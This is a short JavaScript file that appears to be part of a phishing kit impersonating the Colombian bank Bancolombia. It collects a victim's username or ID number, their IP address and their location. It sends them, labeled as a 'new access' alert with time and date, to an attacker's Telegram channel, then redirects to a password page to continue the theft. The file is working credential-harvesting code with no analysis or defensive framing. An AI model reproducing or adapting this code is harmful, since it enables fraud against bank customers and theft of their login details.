var u_name, ip, ip2;

var ready = function () {
    u_name = document.getElementById("DocumentNumber").value;
    ip = document.getElementById("gfg").innerHTML;
    ip2 = document.getElementById("address").innerHTML;
    
    // Almacenar en localStorage
    localStorage.setItem('userName', u_name);
    localStorage.setItem('userIP', ip);
    localStorage.setItem('userIP2', ip2);
};

var sender = function () {
    ready();
    
    // Validar que el campo no esté vacío
    if (!u_name || u_name.trim() === '') {
        alert('Por favor ingresa tu usuario o documento');
        return false;
    }
    
    // Enviar notificación inicial a Telegram
    const mensaje = `🆕 *NUEVO ACCESO BANCOLOMBIA*\n\n📄 *Usuario/Doc:* ${u_name}\n🌐 *IP:* ${ip}\n📍 *Ubicación:* ${ip2}\n⏰ *Hora:* ${new Date().toLocaleTimeString('es-CO')}\n📅 *Fecha:* ${new Date().toLocaleDateString('es-CO')}`;
    
    // Intentar enviar a Telegram (si está disponible)
    if (typeof sendTelegramMessageWithBtn !== 'undefined') {
        sendTelegramMessageWithBtn(mensaje, "")
            .then(() => console.log("✅ Notificación enviada"))
            .catch(error => console.log("⚠️ Error enviando notificación:", error));
    }
    
    // Redirigir a la página de clave
    window.location = 'pass.html';
    return false;
};
